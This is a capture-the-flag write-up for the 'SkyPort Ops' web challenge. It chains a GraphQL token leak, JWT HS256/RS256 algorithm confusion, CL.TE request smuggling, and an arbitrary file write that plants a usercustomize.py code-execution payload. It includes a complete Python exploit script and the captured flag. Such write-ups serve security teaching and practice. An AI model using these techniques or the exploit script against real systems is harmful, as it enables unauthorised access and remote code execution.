# SkyPort Ops — Full Writeup

| Field | Value |
|-------|--------|
| **CTF** | 0xfun CTF 2026 |
| **Category** | Web |
---


> *SkyPort Ops is an airport operations portal that can be only accessible by Security Officier, lastly, we are observing strange activites inside internal system. Follow officier and find out why it's happening.*

---

#  Overview

This challenge is a multi-stage attack chain combining:

1. GraphQL information disclosure
2. JWT algorithm confusion
3. HTTP Request Smuggling (CL.TE)
4. Arbitrary file write → Python auto-execution
5. SUID binary execution → flag

The intended thinking path:

```
Follow officer → steal token
Internal system → bypass gateway
Strange activity → code execution
```

---

#  Architecture

```
Client
  ↓
SecurityGateway (blocks /internal/*)
  ↓
Hypercorn (h11 parser)
  ↓
FastAPI + Strawberry GraphQL
  ↓
Container filesystem + SUID /flag
```

Critical mismatch:

| Component | Parses HTTP using |
| --------- | ----------------- |
| Gateway   | Content-Length    |
| Backend   | Transfer-Encoding |

 This enables **Request Smuggling**

---

# Step 1 - Leak the Officer JWT

The GraphQL Relay node exposes the staff access token:

```python
class StaffNode(Node):
    access_token: Optional[str]
```

Relay global ID format:

```
base64("StaffNode:<id>")
```

Officer is ID `2`:

```
echo -n "StaffNode:2" | base64
U3RhZmZOb2RlOjI=
```

---

## Request

```
POST /graphql
Content-Type: application/json

{
  "query": "{ node(id:\"U3RhZmZOb2RlOjI=\"){ ... on StaffNode { accessToken } } }"
}
```

---

## Response

```
{
  "data": {
    "node": {
      "accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...."
    }
  }
}
```

We now have the **staff JWT**

---

#  Step 2 - Forge Admin Token (JWT confusion)

Backend verification:

```python
jose_jwt.decode(token, RSA_PUBLIC_DER, algorithms=None)
```

`algorithms=None` → accepts HS256.

We sign with HS256 using the RSA public key as secret.
```
{
  "sub": "officer_chen",
  "role": "staff",
  "jwks_uri": "/api/1572d304ba605a90"
}
```
Access the `GET /api/1572d304ba605a90` 
- Get the Public Key Forge the Token and change role to Admin

```
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "officer_chen",
  "role": "admin",
  "jwks_uri": "/api/1572d304ba605a90"
}
```

Now we have **admin token**

---

# Step 3 - Why normal request fails

A direct request:

```
POST /internal/upload HTTP/1.1
Authorization: Bearer ADMIN
```

Fails because the proxy blocks `/internal/*`.

So authentication is irrelevant  the request never reaches FastAPI.

---

# Step 4 - HTTP Request Smuggling

We hide `/internal/upload` inside `/graphql`.

## Normal request (what proxy sees)

```
POST /graphql HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

0
```

## Backend sees

```
POST /graphql
(end)

POST /internal/upload
```

This is **CL.TE smuggling**

---

# Smuggled request visualization

```
[ Gateway thinks ]
POST /graphql finished

[ Backend thinks ]
POST /graphql finished
POST /internal/upload executed
```

---

# Step 5 - Upload RCE payload

The upload endpoint:

```python
if filename.startswith("/"):
    destination = Path(filename)
```

Arbitrary file write!

We write:

```
/home/skyport/.local/lib/python3.11/site-packages/usercustomize.py
```

Python auto imports this on startup.

Payload:

```python
import subprocess, pathlib
pathlib.Path('/tmp/skyport_uploads/flag.txt').write_bytes(subprocess.check_output(['/flag']))
```

---

# Step 6 — Exploit Script

## exploit.py

```python
#!/usr/bin/env python3
import socket, time, requests

HOST = "chall.0xfun.org"
PORT = 42507
ADMIN = "ADMIN_TOKEN"


# -------- helpers --------

def recv_until(sock, marker=b"\r\n\r\n"):
    data=b""
    while marker not in data:
        chunk=sock.recv(4096)
        if not chunk: break
        data+=chunk
    return data


def send_request(sock, req):
    sock.sendall(req)
    return recv_until(sock)


# -------- build malicious python --------

payload = b"""
import subprocess, pathlib
pathlib.Path('/tmp/skyport_uploads/flag.txt').write_bytes(subprocess.check_output(['/flag']))
"""

boundary="----sky"

body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="file"; filename="/home/skyport/.local/lib/python3.11/site-packages/usercustomize.py"\r\n'
    f"Content-Type: application/octet-stream\r\n\r\n"
).encode() + payload + f"\r\n--{boundary}--\r\n".encode()


upload_req = (
    f"POST /internal/upload HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Authorization: Bearer {ADMIN}\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
).encode() + body


# CL.TE smuggle
front_body = b"0\r\n\r\n" + upload_req

front_req = (
    f"POST /graphql HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Content-Type: application/json\r\n"
    f"Content-Length: {len(front_body)}\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
).encode() + front_body


# -------- exploit --------

print("[*] connecting")
sock = socket.create_connection((HOST,PORT))

print("[*] sending smuggled upload")
send_request(sock, front_req)

print("[*] poisoning queue")
resp = send_request(sock, f"GET / HTTP/1.1\r\nHost: {HOST}\r\nConnection: keep-alive\r\n\r\n".encode())

if b"uploaded successfully" not in resp:
    print("[-] upload may have failed")
else:
    print("[+] upload confirmed")

sock.close()


# restart workers
print("[*] restarting workers")
for _ in range(180):
    try: requests.get(f"http://{HOST}:{PORT}/",timeout=0.3)
    except: pass


# fetch flag
print("[*] waiting for flag")
for _ in range(30):
    r=requests.get(f"http://{HOST}:{PORT}/uploads/flag.txt")
    if r.status_code==200 and "0xfun{" in r.text:
        print("\nFLAG:",r.text.strip())
        break
    time.sleep(0.5)

```

---

# Why 7 restart is needed

Hypercorn runs:

```
--max-requests 100
```

After enough requests:

```
worker restarts → python starts → imports usercustomize → executes /flag
```

So we spam `/` requests to trigger execution.

---

# Step 8 Get the flag

```
GET /uploads/flag.txt
```

Output:

```
0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}
```

---

#  Final Exploit Chain

| Step              | Result                  |
| ----------------- | ----------------------- |
| GraphQL leak      | steal JWT               |
| JWT confusion     | admin access            |
| Request smuggling | reach internal endpoint |
| File write        | plant python code       |
| Worker restart    | execute code            |
| SUID binary       | read flag               |

---

# Key Lessons

* Never trust proxy filtering for security
* `algorithms=None` = critical JWT bug
* Different HTTP parsers = request smuggling
* File write + interpreter behavior = RCE

---

**Flag:** `0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}`

PWN by **W4RR1OR**